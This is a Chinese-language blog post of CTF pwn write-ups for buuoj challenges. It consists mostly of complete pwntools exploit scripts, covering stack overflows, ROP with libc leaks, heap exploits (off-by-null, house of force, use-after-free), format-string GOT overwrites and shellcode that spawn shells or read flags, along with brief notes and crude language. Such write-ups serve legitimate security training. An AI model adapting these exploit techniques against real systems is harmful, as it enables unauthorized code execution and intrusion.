---
layout: post
title:  "buuoj-从Pwn到去世(2)"
date:   2020-1-18
desc: ""
keywords: ""
categories: [Ctf]
tags: [CTF,buuoj,Pwn]
icon: icon-html
---

# buuoj-从Pwn到去世(2)

### qctf_2018_dice_game

覆盖随机数种子

```c
int main(int argc, char const *argv[])
{
	srand(0);
	for (int i = 0; i < 50 ; ++i)
		printf("%d,",rand()%6+1);
	return 0;
}
```



```python
from pwn import *
context.log_level='debug'
r = remote("node3.buuoj.cn", 29826)
nmsl = [2,5,4,2,6,2,5,1,4,2,3,2,3,2,6,5,1,1,5,5,6,3,4,4,3,3,3,2,2,2,6,1,1,1,6,4,2,5,2,5,4,4,4,6,3,2,3,3,6,1]
r.recvuntil(" let me know your name: ")
r.send("A" * 0x40 + p64(0))
for i in nmsl:
	r.recvuntil("Give me the point(1~6): ")
	r.sendline(str(i))

r.interactive()
```

### qctf2018_stack2

```python
from pwn import *
r = remote('node3.buuoj.cn',27835)
context.log_level = 'debug'

def change(offset, num):
	r.sendline('3')
	r.recvuntil("which number to change:")
	r.sendline(str(offset))
	r.recvuntil('new number:')
	r.sendline(str(num))

r.recvuntil("How many numbers you have:")
r.sendline('1')
r.recvuntil("Give me your numbers")
r.sendline('1')

change(0x84, 0x9b)
change(0x85, 0x85)
change(0x86, 0x04)
change(0x87, 0x08)

r.sendline('5')
r.interactive()


```



### qctf_2018_babyheap

off by null

伪造堆块，off by null改size，free引发堆块合并再拿回来，得到unsorted bin

堆块重叠控制fd，打free_hook

```python
from pwn import *
#context.log_level = 'debug'
#r = remote('node3.buuoj.cn',25567)
r = process('./QCTF_2018_babyheap')
elf = ELF ('./QCTF_2018_babyheap')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')

def create(size,data):
	r.recvuntil('Your choice :')
	r.sendline('1')
	r.recvuntil('Size:')
	r.sendline(str(size))
	r.recvuntil('Data:')
	r.sendline(data)

def delete(index):
	r.recvuntil('Your choice :')
	r.sendline('2')
	r.recvuntil('Index')
	r.sendline(str(index))
def show():
	r.recvuntil('Your choice :')
	r.sendline('3')


create(0xf8,'')
create(0x648,'a'*0x5f0+p64(0x600))
create(0x500,'')
create(0x100,'')
delete(0)
delete(1)

create(0xf8,'b'*0xf8)
create(0x4f8,'')
create(0xf8,'')

delete(1)
delete(2)
create(0x4f8,'')
show()

r.recvuntil('4 : ')
libc_base = u64(r.recv(6)+'\x00'*2)-0x3ebca0
log.success(hex(libc_base))
create(0xf8,'')
delete(4)
delete(2)
free_hook = libc_base + libc.sym['__free_hook']
system = libc_base + libc.sym['system']
create(0xf8,p64(free_hook))
create(0xf8,p64(free_hook))
create(0xf8,p64(system))
create(0xf8,'/bin/sh\x00')
delete(6)
r.interactive()
```



### bjdctf_2020_babystack

```python
from pwn import *
r = remote('node3.buuoj.cn',29497)
r.sendline('-1')
payload = 'a'*0x18 + p64(0x4006e6)

r.sendline(payload)
r.interactive()
```

### bjdctf_2020_babystack2

```python
from pwn import *
r = remote('node3.buuoj.cn',27189)
payload = 'a'*0x18 + p64(0x400726)
r.sendline('-1')
r.sendline(payload)
r.interactive()
```



### bjdctf_2020_babyrop

```python
from pwn import *

r = remote('node3.buuoj.cn',28246)
elf = ELF('./bjdctf_2020_babyrop')
libc = ELF('./libc-2.23.so')
vuln = elf.symbols['vuln']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
pop_rdi_ret = 0x400733

payload = 'a'*0x28+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(vuln)

r.recvuntil('story!\n')
r.sendline(payload)
leak = u64(r.recvuntil('\n',drop=True).ljust(8,"\x00"))
libc_base = leak - libc.sym['puts']
system_addr = libc_base + libc.sym['system']
binsh_addr = libc_base + libc.search("/bin/sh").next()

payload = 'a'*0x28+p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr)
r.recvuntil('story!\n')
r.sendline(payload)
r.interactive()
```



### bjdctf_2020_YDSneedGrirlfriend

```python
from pwn import *

r = remote('node3.buuoj.cn',26046)

def add(size,name):
	r.recvuntil('Your choice :')
	r.sendline('1')
	r.recvuntil('Her name size is :')
	r.sendline(str(size))
	r.recvuntil('Her name is :')
	r.sendline(name)

def free(index):
	r.recvuntil('Your choice :')
	r.sendline('2')
	r.recvuntil('Index :')
	r.sendline(str(index))

def show(index):
	r.recvuntil('Your choice :')
	r.sendline('3')
	r.recvuntil('Index :')
	r.sendline(str(index))

add(0x80,'fuck')
add(0x80,'fuck')
free(0)
free(1)
add(0x10,p64(0x400B9C))
show(0)
r.interactive()

```



### hitcontraining_uaf

```python
from pwn import *
r = remote('node3.buuoj.cn',28026)
fuck = 0x8048945

def add(size,content):
	r.recvuntil('Your choice :')
	r.sendline('1')
	r.recvuntil('Note size :')
	r.sendline(str(size))
	r.recvuntil('Content :')
	r.sendline(content)

def free(index):
	r.recvuntil('Your choice :')
	r.sendline('2')
	r.recvuntil('Index :')
	r.sendline(str(index))

def show(index):
	r.recvuntil('Your choice :')
	r.sendline('3')
	r.recvuntil('Index :')
	r.sendline(str(index))

add(0x60,'fuck')
add(0x60,'fuck')
free(0)
free(1)
add(0x60,p32(fuck))
show(0)
r.interactive()
```



### hitcontraining_heapcreator

off by one

```
pwndbg> x/64gx 0x17fb000
0x17fb000:      0x0000000000000000      0x0000000000000021//0
0x17fb010:      0x0000000000000018      0x00000000017fb030
0x17fb020:      0x0000000000000000      0x0000000000000021//0
0x17fb030:      0x6161616161616161      0x6161616161616161
0x17fb040:      0x6161616161616161      0x0000000000000041//1
0x17fb050:      0x0000000000000000      0x0000000000000000
0x17fb060:      0x0000000000000000      0x0000000000000021//1
0x17fb070:      0x0000000000000038      0x0000000000602028//content_ptr(puts_got)
0x17fb080:      0x000000000000000a      0x0000000000020f81
```

```python
from pwn import *
r = remote('node3.buuoj.cn',25620)
#r = process('./heapcreator')
elf = ELF('./heapcreator')
libc = ELF('/libc-2.23.so')

def create(szie,content):
	r.recvuntil('Your choice :')
	r.sendline('1')
	r.recvuntil(':')
	r.sendline(str(szie))
	r.recvuntil(':')
	r.sendline(content)

def edit(index,content):
	r.recvuntil('Your choice :')
	r.sendline('2')
	r.recvuntil(':')
	r.sendline(str(index))
	r.recvuntil(':')
	r.sendline(content)

def show(index):
	r.recvuntil('Your choice :')
	r.sendline('3')
	r.recvuntil(':')
	r.sendline(str(index))

def free(index):
	r.recvuntil('Your choice :')
	r.sendline('4')
	r.recvuntil(':')
	r.sendline(str(index))

puts_got = elf.got['puts']
create(0x18,'fuck')
create(0x18,'fuck')
edit(0,'a'*0x18+'\x41')
free(1)
create(0x38,'aaaa')
edit(1,p64(0)*3+p64(0x21)+p64(0x38)+p64(puts_got))
show(1)
r.recvuntil('Content : ')
leak = r.recvuntil('\n',drop=True)
leak = leak.ljust(8,'\x00')
leak = u64(leak)
log.success(hex(leak))
libc_base = leak - libc.sym['puts']
log.success(hex(libc_base))
one = libc_base + 0xf02a4
edit(1,p64(one))

r.interactive()
```



### hitcontraining_bamboobox

house of force

有个放着hello_message和goodbye_message函数的白给chunk，把goodbye_message改成magic，exit拿flag

edit size没验，可以溢出改top chunk size，把指针抬到白给chunk

```python
from pwn import *
r = remote('node3.buuoj.cn',28044)
#r = process('./bamboobox')
elf = ELF('./bamboobox')

magic = 0x400d49

def show():
	r.sendlineafter('Your choice:','1')

def add(size,name):
	r.sendlineafter('Your choice:','2')
	r.sendlineafter('name:',str(size))
	r.sendlineafter('item:',name)

def edit(index,size,name):
	r.sendlineafter('Your choice:','3')
	r.sendlineafter('item:',str(index))
	r.sendlineafter('name:',str(size))
	r.sendafter('item:',name)

def free(index):
	r.sendlineafter('Your choice:','4')
	r.sendlineafter('item:',str(index))


add(0x60,'fuck')
edit(0,0x70,'a'*0x60+p64(0)+'\xff'*8)
add(-0x70-0x20-0x10,'aaaa')
add(0x20,p64(magic)*2)
r.interactive()
```

但是靶🐓里没有/home/bamboobox/flag，👴得getshell



###  [极客大挑战 2019]Not Bad

```python
from pwn import *
context_arch='amd64'
r = remote('node3.buuoj.cn',26465)
shellcode1 = '''
push 0x67616c66
mov rdi,rsp 
push 0
pop rsi
push 0x28
pop rdx
push 2
pop rax
syscall
mov rdi,rax
mov rsi,rsp
push 0
pop rax
syscall
push 1
pop rdi
push 1
pop rax
syscall
'''

shellcode1 = asm(shellcode1,arch='amd64',os='linux')
log.info(hex(len(shellcode1)))
shellcode2 = '''
sub rsp,0x30
jmp rsp
'''
shellcode2 = asm(shellcode2,arch='amd64',os='linux')

log.info(hex(len(shellcode2)))

jmp_rsp = 0x400a01
payload=shellcode1.rjust(0x28,'\x90')+p64(jmp_rsp)+shellcode2
r.sendline(payload)
r.interactive()

#flag{f206f83f-ddae-48de-a6fc-af7d728df04
#flag{f206f83f-ddae-48de-a6fc-af7d728df04f}

```

flag读到rsp只能出0x28位，剩下两位出不来，最后一位}，还有一位，👴选择爆破平台

### bcloud_bctf_2016

```c
unsigned int fuck_name()
{
  char s; // [esp+1Ch] [ebp-5Ch]
  char *v2; // [esp+5Ch] [ebp-1Ch]
  unsigned int v3; // [esp+6Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  memset(&s, 0, 0x50u);
  puts("Input your name:");
  get_content((int)&s, 0x40, 10);
  v2 = (char *)malloc(0x40u);
  dword_804B0CC = (int)v2;
  strcpy(v2, &s);
  print_fuck((int)v2);
  return __readgsdword(0x14u) ^ v3;
}
```

s填满，s和v2中间没\0，strcpy直接全写到v2里，然后打印出来，可以泄露堆地址

```c
unsigned int fuck_org_host()
{
  char s; // [esp+1Ch] [ebp-9Ch]
  char *v2; // [esp+5Ch] [ebp-5Ch]
  int v3; // [esp+60h] [ebp-58h]
  char *v4; // [esp+A4h] [ebp-14h]
  unsigned int v5; // [esp+ACh] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  memset(&s, 0, 0x90u);
  puts("Org:");
  get_content((int)&s, 64, 10);
  puts("Host:");
  get_content((int)&v3, 64, 10);
  v4 = (char *)malloc(0x40u);
  v2 = (char *)malloc(0x40u);
  dword_804B0C8 = (int)v2;
  dword_804B148 = (int)v4;
  strcpy(v4, (const char *)&v3);
  strcpy(v2, &s);
  puts("OKay! Enjoy:)");
  return __readgsdword(0x14u) ^ v5;
}
```

s填满，s和v3都进v2，v2连着top chunk，能改top chunk size

把top chunk挪到放堆指针的地方，然后打got表基本操作

```python
from pwn import *
r = remote('node3.buuoj.cn',26911)
#r = process('./bcloud_bctf_2016')
elf = ELF('./bcloud_bctf_2016')
libc = ELF('./libc-2.23.so')
def add(size,content):
	r.sendlineafter('option--->>','1')
	r.sendlineafter('note content:',str(size))
	r.sendlineafter('content:',content)

def edit(index,content):
	r.sendlineafter('option--->>','3')
	r.sendlineafter('id:',str(index))
	r.sendlineafter('content:',content)

def free(index):
	r.sendlineafter('option--->>','4')
	r.sendlineafter('id:',str(index))

def syn():
	r.sendlineafter('option--->>','5')


atoi_got = elf.got['atoi']
free_got = elf.got['free']
puts_plt = elf.plt['puts']
log.info(hex(free_got))
log.info(hex(atoi_got))

r.recvuntil('Input your name:')
r.send('a'*0x40)
r.recvuntil('a'*0x40)
leak_heap = u32(r.recvuntil('!',drop=True))-8
log.success(hex(leak_heap))

r.recvuntil('Org:')
r.send('a'*0x40)
r.recvuntil('Host:')
r.sendline(p32(0xffffffff))

fuck_addr = 0x804B0A0
#note:0x804B120
size = -(leak_heap+3*0x48+0x10-fuck_addr)
add(size,'fuck')
add(0x400,p32(8)*32+p32(free_got)+p32(atoi_got)+p32(atoi_got))

edit(0,p64(puts_plt))
free(1)
r.recv(1)
atoi_leak = u32(r.recvuntil('\nDelete',drop=True))
libc_base = atoi_leak - libc.sym['atoi']
log.success(hex(libc_base))
system = libc_base + libc.sym['system']
edit(2,p32(system))
r.sendline('/bin/sh\x00')
r.interactive()
```

### cmcc_simplerop

```python
from pwn import *
r = remote('node3.buuoj.cn',26394)
elf = ELF('./simplerop')
read_plt = elf.symbols['read']
bss_addr = elf.bss()
pop_edx_ecx_ebx_ret = 0x0806e850
pop_eax_ret = 0x080bae06
int80 = 0x080493e1
payload = 'a'*0x1c+'fuck'+p32(read_plt)+p32(pop_edx_ecx_ebx_ret)+p32(0)+p32(bss_addr)+p32(0x8)
payload += p32(pop_edx_ecx_ebx_ret)+p32(0)+p32(0)+p32(bss_addr)
payload += p32(pop_eax_ret)+p32(11)+p32(int80)
r.sendlineafter(' :', payload)
r.sendline('/bin/sh\x00')
r.interactive()

```

### axb_2019_fmt32

```python
from pwn import *
r = remote('node3.buuoj.cn',27047)
elf = ELF('./axb_2019_fmt32')
libc = ELF('./libc-2.23.so')
printf_got = elf.got['printf']
r.recvuntil('me:')
r.sendline("%9$s#" + p32(printf_got))
r.recvuntil('Repeater:')
puts_leak = r.recv(4)
libc_base = u32(puts_leak)-libc.sym['printf']
log.success(hex(libc_base))
one = libc_base + 0x3a80c
payload = 'a'+fmtstr_payload(8,{0x804A014:one},numbwritten = 10)
r.recvuntil('me:')
r.sendline(payload)
r.interactive()
```

### xdctf2015_pwn200

```python
from pwn import *
r = remote('node3.buuoj.cn',27287)
elf = ELF('./bof')
libc = ELF('./libc-2.23.so')

pop3_ret = 0x08048629
write_plt = elf.plt['write']
write_got = elf.got['write']
main = elf.sym['main']
print(hex(main))
payload = 'a'*0x70+p32(write_plt)+p32(0x080484d6)+p32(1)+p32(write_got)+p32(4)
r.recvuntil('XDCTF2015~!\n')
r.sendline(payload)
write_leak = u32(r.recv(4))
libc_base = write_leak-libc.sym['write']
log.success(hex(libc_base))
system = libc_base+libc.sym['system']
binsh =  libc_base + libc.search(b'/bin/sh\x00').next()
payload = 'a'*0x70+p32(system)+p32(0)+p32(binsh)
r.sendline(payload)
r.interactive()
```

### axb_2019_fmt64

```python
from pwn import *
r = remote('node3.buuoj.cn',27250)
elf = ELF('./axb_2019_fmt64')
libc = ELF('/libc-2.23.so')
sprintf_got = elf.got['sprintf']
payload = '%9$sfuck'+p64(sprintf_got)
log.info(hex(sprintf_got))
r.recvuntil(':')
r.sendline(payload)
r.recvuntil('Repeater:')
sprintf_leak = u64(r.recvuntil('fuck',drop=True).ljust(8,'\x00'))
libc_base = sprintf_leak-libc.sym['sprintf']
log.success(hex(libc_base))
one = libc_base+0x45216
log.info(hex(one))
fuck1 = one & 0xffff
fuck2 = (one >> 16) & 0xffff
payload = ''
payload += '%' + str(fuck1 - 9) + 'c%12$hn'
payload += '%' + str(fuck2-fuck1) + 'c%13$hn'
payload = payload.ljust(0x20,'\x00')
payload += p64(sprintf_got) + p64(sprintf_got + 2)

r.recvuntil(':')
r.sendline(payload)

r.interactive()

```

### axb_2019_brop64

```python
from pwn import *
r = remote('node3.buuoj.cn',26021)
elf = ELF('./axb_2019_brop64')
libc = ELF('/libc-2.23.so')
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
pop_rdi_ret = 0x400963
main = 0x4007D6
payload = 'a'*0xd8+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main)
r.sendline(payload)
puts_leak = u64(r.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
libc_base = puts_leak - libc.sym['puts']
log.success(hex(libc_base))
one = libc_base+0x45216 
payload = 'a'*0xd8+p64(one)
r.sendline(payload)
r.interactive()
```

### pwnable_orw

```python
from pwn import *
r = remote('node3.buuoj.cn',27349)
elf = ELF('./orw')
bss = elf.bss()
shellcode = shellcraft.open('flag')
shellcode += shellcraft.read(3,bss,0x200)
shellcode += shellcraft.write(1,bss,0x200)
print(shellcode)
shellcode = asm(shellcode)
r.sendline(shellcode)
r.interactive()
```

